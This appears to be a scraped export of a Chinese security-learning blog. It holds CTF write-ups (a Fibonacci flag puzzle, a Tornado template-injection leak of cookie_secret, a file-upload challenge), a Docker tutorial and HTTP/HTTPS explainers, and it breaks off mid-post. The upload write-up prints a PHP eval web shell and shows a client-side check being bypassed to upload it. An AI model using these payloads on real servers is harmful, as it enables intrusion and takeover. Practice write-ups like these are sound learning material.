10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 21783091 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 1771136968853882116725547342176952286 规则如下： 第零位1还是1，没有位移。 第一位233是斐波那契数列的第十二位（以0开始算），因此下面神秘数字串的第一位的6是原本flag的第十二位。 第二位3是斐波那契数列的第三位，因此下面神秘数字串的第二位的9是原本flag的第三位。 以此类推……，写出如下脚本。 1234567891011121314151617# coding=utf-8fb = &#x27;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&#x27;t = &#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 &#x27;m = &#x27;36968853882116725547342176952286&#x27;s = &#x27;a&#x27; * 32s = list(s)fb = fb.split(&#x27; &#x27;)t = t.split(&#x27; &#x27;)for i in range(32): s[fb.index(t[i])] = m[i]for i in range(32): print(s[i], end=&#x27;&#x27;) 输出结果中还存在a，是因为斐波那契数列中存在两个1，而在index()找位置的时候，是从前往后找的，因此两次的1会覆盖掉。所以要将m中t的第二次出现1的位置上的数替换给a，然后复原被覆盖的值。"},{"title":"护网杯——easy_tornado","date":"24/03/2020","path":"2020/03/24/20200324165054/","text":"首先我们打开网页，发现三个链接。 点击第一个flag.txt，打开提示我们： 我们观察url： 1http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;77e8b02dac1f3d976567bc691476bfcc 发现通过get传递两个参数，一个filename，一个filehash。因此我们可以构造url，访问flag的位置。 1http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;77e8b02dac1f3d976567bc691476bfcc 访问发现返回Error。 因此查看另外两个文件的信息。 发现render，判断这是一个web框架的方法，而下面hints.txt的内容则告诉了我们上面url中的filehash是如何生成的。 现在我们不知道cookie_secret是多少，我们无论通过F12，在network中查看，还是抓包分析，都没有发现cookie_secret的值。 现在render这个信息还没有用，那么有没有可能漏洞是出现在这个函数中呐。 我们通过百度题目名tornado，发现这是一个python的web框架，坚信了问题是在这个框架上面。 百度tornado render漏洞，发现render是通过传递的参数来确定返回的内容，而我们的报错页面正是通过参数来显示的，因此我们可以利用它来返回tornado中的一些定义的对象。 1http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125; 返回信息中确定cookie_secret的值为： 1&#x27;cookie_secret&#x27;: &#x27;d27d0275-4f9b-45f6-b948-37f6b05c8d42&#x27; 现在我们可以编写脚本，计算hash值： 12345678910# coding=utf-8from hashlib import md5cookie_secret = &#x27;d27d0275-4f9b-45f6-b948-37f6b05c8d42&#x27;file_name = &#x27;/fllllllllllllag&#x27;file_hash = md5(cookie_secret + md5(file_name).hexdigest())print(file_hash.hexdigest()) 我们可以先将file_name写为/file.txt，执行获得hash值，和原来url中的filehash是否一样，判断脚本正确性。 执行脚本得到hash值： 1a99916bbf8732bd409c33d161d751c90 构造url： 1http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;a99916bbf8732bd409c33d161d751c90 访问该url得到flag值。"},{"title":"docker的简单使用","date":"23/03/2020","path":"2020/03/23/20200323164259/","text":"本文所写环境是在mac下，所以其他环境下的安装过程就不在赘述，如有需要，可以自行百度，资源还是不少的。 在学习docker之前，建议先熟悉linux下的命令操作和相关的背景知识学习。 Docker概念docker是一个开源的应用容器引擎。诞生于2013年初，基于Go语言实现，dotCloud公司出品（后改为Docker Inc）。docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的linux机器上。 容器是完全使用沙箱机制，相互隔离。容器性能开销极低。 docker从17.3版本之后分为CE（Community Edition社区版）和EE（Enterprise Edition企业版）。 docker是一种容器技术，解决环境迁移问题。 我们可以将docker简单的理解为是一种虚拟化技术，虚拟出一个个的虚拟机，然后在这一个个虚拟机中部署服务，当迁移的时候，直接迁移整个虚拟机，将环境和代码同时迁移，解决在生产环境中的环境不匹配的问题。 MAC下Docker安装mac下安装docker可以通过homebrew。homebrew的Cask已经支持Docker for Mac。 1brew cask install docker homebrew是一个mac下的包管理工具。 配置阿里云镜像加速器因为默认情况下是从国外下载镜像，因此速度格外的慢。好在大厂已经提供了镜像供我们使用。这里以配置阿里云镜像为例。 打开阿里云网站，登录，搜索容器镜像服务，打开后如下： 找到自己的加速器地址。点击状态栏docker-&gt;Preferences-&gt;Deamon。 点击+，将自己的加速器地址添加到Registry mirrors。然后重启Docker服务，完成配置。 Docker架构 image和container的关系就相当于类和对象的关系。 **镜像(image)**：Docker镜像，就相当于是一个root文件系统，比如官方镜像ubuntu:16.04就包含了完整的一套ubuntu16.04最小系统的root文件系统。 **容器(container)**：镜像（image）和容器（container）的关系，就像是面向对象程序设计中的类和对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 **仓库(Repository)**：仓库可以理解为git的仓库，git保存的是代码，Docker保存的是镜像。Docker的远程仓库是Docker Hub。 Docker命令镜像相关命令 命令 含义 docker images 查看下载的镜像 docker search centos 搜索镜像，如centos docker pull centos[:7] 拉取镜像，[]可加可不加，是确定其版本。 docker rmi centos[:7] 删除镜像 docker rmi `docker images -q` 删除所有镜像 容器相关命令 命令 含义 docker ps 查看容器 docker ps -a 查看所有容器，包括停止的 docker run -it –name=容器名 mysql /bin/bash 创建mysql镜像的容器，并打开交互命令行 docker run -id –name=容器名 mysql:5.0 /bin/bash 后台创建mysql:5.0镜像的容器 docker exec -it 容器名 /bin/bash 交互命令行打开已创建容器 docker start 容器名 启动容器 docker stop 容器名 停止容器 docker rm 容器名/容器id 删除容器 docker inspect 容器名 查看容器信息 docker容器的数据卷 docker容器删除后，在容器中产生的数据还在吗？ 容器删除后，在容器中产生的数据也会随着容器的删除而被删除。 docker容器和外部机器可以直接交换文件吗？ docker容器是一个封闭的容器，无法和外部机器交换文件。 docker容器之间想要进行数据交互？ 因docker容器的封闭，容器之间一般是无法进行数据交换的。 为了解决这三个问题，引入了数据卷。 概念数据卷是宿主机中的一个目录或文件。 在容器中也创建一个目录，将宿主机中的目录挂载到容器中的这个目录，这个时候宿主机的目录就称为数据卷。 当容器目录和数据卷目录绑定后，对方的修改会立即同步。 一个数据卷可以被多个容器同时挂载。 数据卷的作用： 容器数据持久化 外部机器和容器间通信 容器之间数据交换 配置数据卷：创建容器时，使用-v参数设置数据卷。 1docker run -id --name=c1 -v 宿主机目录(文件):容器内目录(文件) centos /bin/bash 注意事项： 目录必须是绝对路径 如果目录不存在，会自动创建 可以挂载多个数据卷 数据卷容器在多容器进行数据交换时，为了方便管理，又引入了数据卷容器的概念，数据卷容器实质是一个容器，它实现了挂载一个目录或文件，然后其他容器再挂载这个容器，它便称之为数据卷容器。 概念比较绕，看下图可以更好理解。 其中Data Container c3便是一个数据卷容器。 配置： 首先配置数据卷容器 1docker run -it --name=c3 -v /volume centos /bin/bash 使用-v参数挂载一个目录，这里没有指定宿主机目录位置，会在宿主机中创建一个默认的目录。 创建启动c1，c2容器，使用–volumes-from参数，设置数据卷容器。 12docker run -it --name=c1 --volumes-from c3 centos /bin/bashdocker run -it --name=c2 --volumes-from c3 centos /bin/bash Docker应用部署 mysql部署在docker容器中部署mysql，并通过外部mysql客户端操作mysql。 操作步骤 搜索mysql镜像 1docker search mysql 搜索mysql，确定要下载的版本。 拉取mysql镜像 1docker pull mysql[:version] 将mysql的镜像下载到本地。 创建容器 首先现在宿主机中创建一个mysql的文件夹，方便管理文件。 12mkdir mysqlcd mysql 创建容器： 1docker run -id -p 3306:3306 --name=m_mysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root mysql 参数说明： 参数 说明 -p 3306:3306 将容器的3306端口映射到宿主机的3306端口 -v $PWD/conf:/etc/mysql/conf.d 将主机当前目录下的conf/my.cnf挂载到容器的/etc/mysql/my.cnf。配置目录 -v $PWD/logs:/logs 将主机当前目录下的logs目录挂载到容器的logs。日志目录 -v $PWD/data:/var/lib/mysql 将主机当前目录下的data目录挂载到容器的/var/lib/mysql。数据目录 -e MYSQL_ROOT_PASSWORD=root 初始化root用户的密码。 通过宿主机或者外部机器中的mysql客户端，操作mysql。 Nginx部署在docker容器中部署Nginx，并通过外部机器访问Nginx。 操作步骤 搜索Nginx镜像。 拉取Nginx镜像。 创建容器。 首先创建nginx目录，方便之后的管理。 创建conf目录，进入创建nginx.conf文件，粘贴下面内容。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#user nobody;worker_processes 1; #error_log logs&#x2F;error.log;#error_log logs&#x2F;error.log notice;#error_log logs&#x2F;error.log info; #pid logs&#x2F;nginx.pid; events &#123; worker_connections 1024;&#125; http &#123; include mime.types; default_type application&#x2F;octet-stream; #log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; # &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; # &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; #access_log logs&#x2F;access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 650; client_max_body_size 20m; proxy_connect_timeout 300; proxy_read_timeout 300; proxy_send_timeout 300; #gzip on; server &#123; listen 80; server_name localhost; #charset koi8-r; #access_log logs&#x2F;host.access.log main; location &#x2F; &#123; root html; &#125; #error_page 404 &#x2F;404.html; # redirect server error pages to the static page &#x2F;50x.html # error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http:&#x2F;&#x2F;127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_read_timeout 300; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; # deny access to .htaccess files, if Apache&#39;s document root # concurs with nginx&#39;s one # #location ~ &#x2F;\\.ht &#123; # deny all; #&#125; &#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location &#x2F; &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # #server &#123; # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_cache shared:SSL:1m; # ssl_session_timeout 5m; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location &#x2F; &#123; # root html; # index index.html index.htm; # &#125; #&#125; include vhosts&#x2F;*.conf;&#125; 开启docker容器： 1Docker run -id --name=d_nginx -p 80:80 -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/var/log/nginx -v $PWD/html:/usr/share/nginx/html nginx Dockerfile Docker镜像的本质是什么？ Docker镜像的本质是分层的文件系统。 Docker中一个centos镜像为什么只要200MB，而一个centos操作系统的ISO文件要几个G？ centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像不用操作系统的bootfs，只有rootfs和其他镜像层。 Docker中一个tomcat镜像为什么有500MB，而一个tomcat安装包只要70多MB？ 由于docker中镜像是分层的，tomcat虽然只有70MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小就是500MB。 操作系统组成部分： 进程调度子系统 进程通信子系统 内存管理子系统 设备管理子系统 文件管理子系统 网络通信子系统 作业控制子系统 文件管理子系统linux文件系统由bootfs和rootfs两部分组成。 bootfs：包含bootloader（引导加载程序）和kernel（内核）。 rootfs：root文件系统，包含的就是典型linux系统中的/dev，/proc，/bin，/etc等标准目录和文件。 不同的linux发行版，bootfs基本相同，而rootfs不同，如ubuntu、centos等。 Docker镜像原理docker镜像是由特殊的文件系统叠加而成。 最底端是bootfs，并使用宿主机的bootfs。 第二层是root文件系统rootfs，称为base image。 然后再往上可以叠加其他的镜像文件。 统一文件系统（UNION File System）技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统。 一个镜像可以放在另一个镜像的上面。位于下面的镜像称为父镜像，最底部的镜像称为基础镜像。 当一个镜像启动容器时，docker会在最顶层加载一个读写文件系统作为容器。 镜像制作Docker下有两种方法来制作镜像。 容器转镜像123docker commit 容器id 镜像名:版本号docker save -o 压缩文件名称 镜像文件:版本号docker load -i 压缩文件名字 以上前两条命令可以将docker容器打包成镜像，并保存成压缩文件。第三条命令可以将压缩文件重新载入到docker中，生成镜像。 commit命令在将容器打包成镜像时，若该容器有数据卷，数据卷中的内容不会打包到镜像中。 Dockerfile文件dockerfile是一个文本文件，包含了一条条的指令。每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像 对于开发人员：可以为开发团队提供一个完全一致的开发环境 对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作。 对于运维人员：在部署时，可以实现应用的无缝移植。 Dockerfile文件中的关键字 关键字 作用 备注 FROM 指定父镜像 指定dockerfile基于哪个image构建 MAINTAINER 作者信息 用来标明这个dockerfile谁写的 LABEL 标签 用来表名dockerfile的标签，可以使用Label代替Maintainer最终都是在docker image基本信息中可以查看 RUN 执行命令 执行一段命令，默认是/bin/sh，格式：RUN command或者RUN [“command”,”param1”,”param2”] CMD 容器启动命令 提供启动容器时候的默认命令和ENTRYPOINT配合使用。格式 CMD command param1 param2或者CMD [“command”,”param1”,”param2”] ENTRYPOINT 入口 一般在制作一些执行就关闭的容器中会使用 COPY 复制文件 build的时候复制文件到image中 ADD 添加文件 build的时候添加文件到image中，不仅仅局限于当前build上下文，可以来源于远程服务 ENV 环境变量 指定build时候的环境变量，可以在启动容器的时候通过-e覆盖，格式ENV name=value ARG 构建参数 构建参数，只在构建的时候使用的参数，如果有ENV，那么ENV的相同名字的值始终覆盖arg的参数 VOLUNE 定意外不可以挂载的数据卷 指定build的image哪些目录可以启动时候挂载到文件系统中，启动容器的时候使用-v绑定。格式 VOLUME [“目录”] EXPOSE 暴露端口 定义容器运行的时候监听的端口，启动容器的时候使用-p来绑定暴露端口。格式 EXPOSE 8080 或者 EXPOSE 8080/udp WORKDIR 工作目录 指定容器内部的工作目录，如果没有创建则自动创建，如果指定/使用的是绝对地址，如果不是/开头，那么实在上一天workdir的路径的相对路径 USER 指定执行用户 指定build或者启动的时候，用户在RUN CMD ENTRYPOINT执行的时候的用户 HEALTHCHECK 健康检查 指定监测当前容器的健康监测的命令，基本上没用，因为很多时候，应用本身有健康监测机制。 ONBUILD 触发器 当存在ONBUILD关键字的镜像作为基础镜像的时候，当执行FROM完成之后，会执行ONBUILD的命令，但是不影响当前镜像，用处也不怎么搭 STOPSIGNAL 发送信号量到宿主机 该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。 SHELL 指定执行脚本的shell 指定RUN CMD ENTRYPOINT执行命令时候使用的shell dockerfile案例需求：自定义一个centos7镜像，设置默认工作路径为/usr，安装net-tools、vim。 dockerfile： 12345FROM centos:7MAINTAINER 0pt1mus &lt;xxxxx@xx.com&gt;RUN yum install -y vim net-toolsWORKDIR /usrCMD /bin/bash 在dockerfile文件所在的目录下执行： 1Docker build -f ./centos_dockerfile -t superj_centos:1 . 最后的.是告诉docker在build时候的上下文环境是当前目录。 由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。 如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。 注意：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。 Docker服务编排服务编排：按照一定的业务规则批量管理容器。 微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停，维护的工作量会很大。 要从dockerfile build image或者去dockerhub拉取image 要创建多个container 要管理这些container（启动停止删除） Docker ComposeDocker compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建，启动和停止。 使用步骤： 利用dockerfile定义运行环境镜像 使用docker-compose.yml定义组成应用的各个服务 运行docker-compose up启动应用 在MAC的环境下，用homebrew安装Docker后，docker compose已默认安装，可直接使用。 案例使用docker compose编排nginx+springboot项目 创建docker-compose目录 12mkdir docker-composecd docker-compose 编写docker-compose.yml文件 1234567891011121314version: &#x27;3&#x27;services: nginx: image: nginx ports: - 80:80 links: - app volumes: - ./nginx/conf.d:/etc/nginx/conf.d app: image: app expose: - &quot;8080&quot; 创建./nginx/conf.d目录 1mkdir -p nginx/conf.d 在./nginx/conf.d目录下编写nginx.conf文件 12345678server&#123; listen 80; access_log off; location / &#123; proxy_pass http://app:8080; &#125;&#125; 在docker-compose目录下使用docker-compose启动容器 1docker-compose up 测试访问。"},{"title":"HTTP详解(七)——确保web安全的HTTPS","date":"23/03/2020","path":"2020/03/23/20200323162450/","text":"在HTTP协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS通信机制可以有效地防止这些问题。 HTTP的缺点HTTP主要有这些不足： 通信使用明文（不加密），内容可能会被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能已遭篡改 通信使用明文可能会被窃听 TCP/IP是可能被窃听的网络 监听相同段上的通信并非难事。只需要手机在互联网上流动的数据包（帧）就行了。 加密处理防止被窃听 加密的对象可以有这么几个： 通信的加密。一种方式就是将通信加密。HTTP协议中没有加密机制，但可以通过和SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用，加密HTTP的通信内容。 用SSL建立安全通信线路之后，就可以在这条线路上进行HTTP通信了。与SSL组合使用的HTTP被称为HTTPS（HTTP Secure，超文本传输安全协议）或HTTP over SSL。 内容的加密。还有一种将参与通信的内容本身加密的方式。由于HTTP协议中没有加密机制，那么就对HTTP协议传输的内容本身加密。即把HTTP报文里所含的内容进行加密处理。 有一点要引起注意，由于该方式不同于SSL或TLS将整个通信线路加密处理，所以内容任然有被篡改的风险。 不验证通信方的身份就可能遭遇伪装HTTP协议中的请求和响应不会对通信方进行确认。 任何人都可发起请求 在HTTP协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外，服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的IP地址和端口号没有被Web服务器设定限制访问的前提下）。 不确认通信方，会存在以下各种隐患： 无法确定返回响应的Web服务器是真正的服务器 无法确定接收响应的客户端是真正的客户端 无法确定正在通信的对方是否具备访问权限。 无法判定请求是来自何方、出自谁手。 即使无意义的请求也照单全收。DoS（Denial of Service，拒绝服务攻击）。 查明对手的证书 HTTP协议无法确定通信方，但使用SSL则可以。SSL不仅提供加密处理，而且还使用了一种被称为证书（证书是第三方颁发的，从技术手段上是很难伪造的）的手段，可用于确定方。 无法证明报文完整性，可能已遭篡改所谓完整性是指信息的准确度。若无法证明其完整性，通常也就意味着无法判断信息是否准确。 接收到的内容可能有误 如何防止篡改 常用的MD5和SHA-1等散列值校验的方法，以及用来确认文件的数字签名方法。 HTTP+加密+认证+完整性保护=HTTPSHTTP加上加密处理和认证以及完整性保护后即是HTTPS。 HTTPS是身披SSL外壳的HTTPHTTPS并非是应用层的一种新协议。只是HTTP通信接口部分用SSL（Secure Socket Layer）和TLS（Transport Layer Security）协议代替而已。 通常，HTTP直接和TCP通信。当使用SSL时，则演变成先和SSL通信，再由SSL和TCP通信了。 SSL是当今世界上应用最为广泛的网络安全技术。 相互交换密钥的公开密钥加密技术SSL采用一种叫做公开密钥加密（Public-key cryptography）的加密方式。 HTTPS采用混合加密机制。HTTPS采用共享密钥加密和公开密钥加密两者并用的混合加密机制。 证明公开密钥正确性的证书公开密钥加密方式还是存在一些问题的。那就是无法证明公开密钥本身就是货真价实的公开密钥。 为了解决上述问题，可以使用由数字证书认证机构（CA，Certificate Authority）和其相关机关颁发的公开密钥证书。 数字证书认证机构的业务流程。首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。 此处认证机关的公开密钥必须安全地转交给客户端。使用通信方式时，如何安全转交是一件很困难的事，因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。 HTTPS的安全通信机制粗粒度的讲解HTTPS的非对称和对称加解密过程（这里是443通信的过程）： 客户端浏览器发起连接，告知自己支持的加密算法和摘要算法等信息。 WEB服务器将确定的加密算法、摘要算法、公钥、域名信息等发给客户端。 客户端生成一个session key，并且将session key用公钥加密后发送给服务器。 服务器用私钥将session key解密出来。 客户端和服务器用session key做对称加密通信。 在上面第二步将服务器公钥发送给客户端的时候，如果有中间人拦截这一数据，并将传送的公钥改为自己的公钥发送给客户端。客户端并不知道消息被篡改，认为接受的公钥就是服务器的公钥，因此通过接受到的公钥加密session key，传送给服务器，又被中间人拦截，这时，攻击者就可以得到session key，之后传递的http信息也会被中间人所查看。因此，在传送公钥的过程中，要保证公钥的正确性。 第二步具体的通信过程为： 首先生成消息，包含确定的加密、摘要算法、服务端公钥、域名信息等。 服务器通过信息摘要，向CA机构申请签名证书。 服务器将信息和证书发送给服务端。 客户端验证证书，提取公钥。"},{"title":"HTTP详解(六)——HTTP首部","date":"13/03/2020","path":"2020/03/13/20200313221726/","text":"HTTP报文首部在请求中，HTTP报文由方法、URI、HTTP版本、HTTP首部字段等部分构成。 在响应中，HTTP报文由HTTP版本、状态码（数字和原因短语）、HTTP首部字段3部分构成。 HTTP首部字段HTTP首部字段传递重要信息HTTP首部字段是构成HTTP报文的要素之一。在客户端与服务器之间以HTTP协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到传递额外重要信息的作用。 使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用的语言、认证信息等内容。 HTTP首部字段结构HTTP首部字段是由首部字段名和字段值构成的，中间用冒号分割。 比如，报文主体的对象类型： 字段值对应单个HTTP首部字段可以有多个值： 4种HTTP首部字段类型根据实际用途被分为以下4种类型 通用首部字段（General Header Fields） 请求报文和响应报文都会使用的首部 请求首部字段（Request Header Fields） 从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。 响应首部字段（Response Header Fields） 从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。 实体首部字段（Entity Header Fields） 针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。 HTTP/1.1首部字段一览通用首部字段 请求首部字段 响应首部字段 实体首部字段 还有一些非HTTP/1.1的首部字段，如：Cookie、Set-Cookie、Content-Dispositon。 End-to-end首部和Hop-by-hop首部HTTP首部字段将定义成缓存代理和费缓存代理的行为，分成2种类型。 端到端首部（End-to-end Header） 分在此类别中的首部会转发给请求/响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。 逐跳首部（Hop-by-hop Header） 分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1和之后版本中，如果要使用hop-by-hop首部，需提供Connection首部字段。 除以上外，都是端到端首部。"},{"title":"HTTP详解(五)——与HTTP协作的Web服务器","date":"13/03/2020","path":"2020/03/13/20200313220856/","text":"用单台虚拟机主机事先多个域名HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点。比如，提供Web托管服务（Web Hosting Service）的供应商，可以用一台服务器为多位客户服务，也可以以每位客户持有的域名运行各自不同的网站。 在访问网页时，DNS将域名解析成IP地址。在相同的IP地址下，由于虚拟主机可以寄存多个不同主机名和域名的Web网站，因此在发送HTTP请求时，必须在Host内部完整指定主机名或域名的URI。 通信数据转发程序：代理、网关、隧道HTTP通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如代理、网关和隧道。它们可以配合服务器工作。 代理： 代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。 网关： 网关是转发其它服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。 隧道： 隧道是在相隔甚远的客户端与服务器两者之间进行中转，并保持双方通信连接的应用程序。 代理代理服务器的基本行为就是接受客户端发送的请求后转发给其他服务器。代理不改变请求URI，会直接发送给前方持有资源的目标服务器。持有资源实体的服务器被称为源服务器。从源服务器返回的响应进过代理服务器后再传给客户端。 使用代理服务器的理由有：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。 代理有多种使用方法，按两种基准分类。一种是否使用缓存，另一种是是否会修改报文。 缓存代理 代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。 透明代理 转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。 网关 利用网关可以由HTTP请求转化为其他协议通信 网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非HTTP协议服务。 利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询数据。另外，在Web购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。 隧道隧道可按要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身不会去解析HTTP请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。 保存资源的缓存缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。 缓存服务器是代理服务器的一种，并归类在缓存代理类型中。 缓存的有效期限当遇上源服务器上的资源更新时，如果还是使用不变的缓存，那就会演变成返回更新前的“旧”资源了。 即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性，若判断缓存失效，缓存服务器将会再次从源服务器上获取“新“资源。 客户端的缓存缓存不仅可以存在于服务器内，还可以存在客户端浏览器中。 比如说，访问一个静态页面，当服务端更新内容后，你在本地之前请求过，现在再次请求，你访问的页面可能就是你之前的缓存，没有刷新出服务器新增的内容。"},{"title":"攻防世界web进阶upload1","date":"13/03/2020","path":"2020/03/13/20200313214351/","text":"打开网站，发现只存在一个选择文件框和一个上传按钮。 我们可以考虑直接上传一个一句话木马尝试。 1&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt; 快速弹出警告框，让上传图片文件。猜测是前端js判断。 F12打开控制台，成功发现js代码，右击直接删掉。 重新选择一句话木马，此时发现上传按钮无法点击，在F12的console中将按钮的disabled设置为false。 1submit.disabled=false 按钮的id值可通过源代码查看得到。 点击上传，得到上传路劲。 通过蚁剑连接一句话木马，成功得到flag。 后记后来写wp的时候，发现可以省略删除js源码那一步，因为虽然弹窗了，但是没有清空选择的文件，可以直接通过更改按钮属性直接上传。 总结写了几道php源码的题，什么phps源码泄露、反序列化，头大，碰到这道简单的，开心死了。"},{"title":"HTTP详解(四)——返回结果的HTTP状态码","date":"10/03/2020","path":"2020/03/10/20200310152827/","text":"HTTP状态码负责表示客户端HTTP请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。 状态码告知从服务器端返回的请求结果状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。 2XX成功2XX的响应结果表明请求被正常处理了。 200 OK表示冲客户端发来的请求在服务器端被正常处理了。 在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用GET方法时，对应请求资源的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。 204 No Content该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求后，返回204响应，那么浏览器显示的页面不发生更新。 一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。 206 Partial Content该状态吗表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。 3XX重定向301 Moved Permanently永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。也就是说，如果已经把资源对应的URI保存为书签了，这时应该按Location首部字段提示的URI重新保存。 302 Found临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。 303 See Other该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。 注：当301、302、303响应码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求会自动再次发送。 301、302标准是禁止将POST方法改变成GET方法的，但实际使用时大家都会这么做。 304 Not 